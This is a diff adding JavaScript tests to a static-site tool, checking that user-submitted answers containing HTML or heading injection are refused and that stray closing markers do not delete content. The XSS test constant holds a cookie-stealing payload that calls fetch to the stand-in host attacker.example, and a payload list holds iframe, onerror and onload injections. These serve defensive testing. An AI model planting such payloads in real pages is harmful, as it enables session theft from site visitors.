@@ -217,3 +217,128 @@ test('acceptance: nothing here reads the clock — the same input gives the same
   assert.equal(first, second);
   assert.ok(!/20\d\d-\d\d-\d\d/.test(first), 'a date reached the record');
 });
+
+// --- C1: what a write may put in front of a reader ------------------------------------------------
+
+// The exact payload the security review posted through the real handler with a valid `author`
+// principal, and got back out of the built site verbatim.
+const XSS =
+  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';
+
+test('records: an answer carrying HTML is refused — the corpus is rendered with html: true', () => {
+  // `src/markdown.mjs` sets `html: true` on purpose (decision 11: the corpus's `<sub>` citations
+  // must survive), and there is no CSP. Before this branch, putting bytes into a record needed
+  // GitHub write access — people who could already do anything. M3 gives that to anyone holding
+  // the Static Web Apps `author` role, which is a portal invitation and NOT GitHub access, so an
+  // answer is untrusted input in a way a record has never been. The endpoint is the only place
+  // that difference can be enforced.
+  const why = whyNotWritableText(XSS);
+  assert.notEqual(why, '', 'the stored-XSS payload was accepted into a record');
+  assert.match(why, /HTML/i);
+});
+
+test('records: every tag-ish opening is refused, not just the ones with a script in them', () => {
+  for (const payload of [
+    '<script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>',
+    '<iframe src="https://attacker.example"></iframe>',
+    '<a href="#" onclick="alert(1)">click</a>',
+    'fine so far </p><svg onload=alert(1)>',
+    '<!-- a comment that is not one of ours -->',
+    '<?php echo 1; ?>',
+    // Decision 11's own vocabulary. An answer is typed into a form, not authored as a document,
+    // so it loses inline HTML too — deliberately, because the alternative is an allow-list of
+    // safe tags, and an allow-list of safe tags is a sanitiser to keep up to date forever.
+    'a citation<sub>1</sub>',
+  ]) {
+    assert.notEqual(whyNotWritableText(payload), '', `${JSON.stringify(payload)} was accepted`);
+  }
+});
+
+test('records: a less-than that is not a tag is still allowed — this is not a ban on the character', () => {
+  for (const fine of ['3 < 4 and 5 > 4', 'a < b', 'x <= y', 'i < 10']) {
+    assert.equal(whyNotWritableText(fine), '', `${JSON.stringify(fine)} was refused`);
+  }
+});
+
+test('records: an entity-encoded tag is allowed, because it renders as text and not as a tag', () => {
+  // markdown-it decodes an entity into text content, never into markup. Refusing this would be
+  // refusing the one way to write about a tag in an answer.
+  assert.equal(whyNotWritableText('use &lt;sub&gt; for citations'), '');
+});
+
+test('records: a setext heading is refused too — HEADING was ATX-only and === slipped past', () => {
+  // The mutation table claimed heading injection was pinned. It was pinned for `#` and not for
+  // the underlined forms, either of which renders as a heading inside somebody else's question.
+  assert.notEqual(whyNotWritableText('Injected Heading\n================'), '');
+  assert.notEqual(whyNotWritableText('Injected\n---'), '');
+  assert.notEqual(whyNotWritableText('Injected\n==='), '');
+});
+
+test('records: an ordinary rule or a table is not a setext heading, and is still allowed', () => {
+  // `---` with a blank line above it is a thematic break, and a table's delimiter row is full of
+  // dashes. Refusing either would make the rule useless for the answers people actually write.
+  assert.equal(whyNotWritableText('Per tenant.\n\n---\n\nAnd nothing else.'), '');
+  assert.equal(whyNotWritableText('| a | b |\n| --- | --- |\n| 1 | 2 |'), '');
+});
+
+// --- I4: a stray closing marker must not swallow the record ---------------------------------------
+
+test('records: a stray closing marker later in the file does not swallow what is between', () => {
+  // `placeBlock` took the LAST closing marker in range rather than the first one after the open,
+  // so a record that happens to contain a second `<!-- /atlas:acceptance -->` — pasted in, copied
+  // from another record, left behind by a hand edit — lost everything between the two.
+  const record = [
+    '# M1 demo script',
+    '',
+    '1. Start the thing.',
+    '',
+    '<!-- atlas:acceptance -->',
+    '**Acceptance: fail** — recorded by someone@example.com through Atlas.',
+    '<!-- /atlas:acceptance -->',
+    '',
+    '## Important section',
+    '',
+    'Something that matters and must survive being re-accepted.',
+    '',
+    '<!-- /atlas:acceptance -->',
+    '',
+  ].join('\n');
+
+  const after = recordAcceptance(record, { result: 'pass', author: AUTHOR });
+
+  assert.match(after, /## Important section/, 'a whole section was silently deleted');
+  assert.match(after, /Something that matters and must survive being re-accepted\./);
+  assert.match(after, /Acceptance: pass/);
+  assert.ok(!/Acceptance: fail/.test(after), 'the superseded result survived');
+});
+
+test('records: the same stray marker in a register does not swallow a later question', () => {
+  const register = [
+    '# Open questions',
+    '',
+    '## Q1 · A question',
+    '',
+    '<!-- atlas:answer -->',
+    '**Answer** (someone@example.com):',
+    '',
+    'First answer.',
+    '<!-- /atlas:answer -->',
+    '',
+    'A paragraph that belongs to Q1 and must survive.',
+    '',
+    '<!-- /atlas:answer -->',
+    '',
+    '## Q2 · Another question',
+    '',
+    'Untouched.',
+    '',
+  ].join('\n');
+
+  const after = answerQuestion(register, { question: 'Q1', answer: 'Second answer.', author: AUTHOR });
+
+  assert.match(after, /A paragraph that belongs to Q1 and must survive\./);
+  assert.match(after, /## Q2 · Another question/);
+  assert.match(after, /Second answer\./);
+  assert.ok(!/First answer\./.test(after));
+});
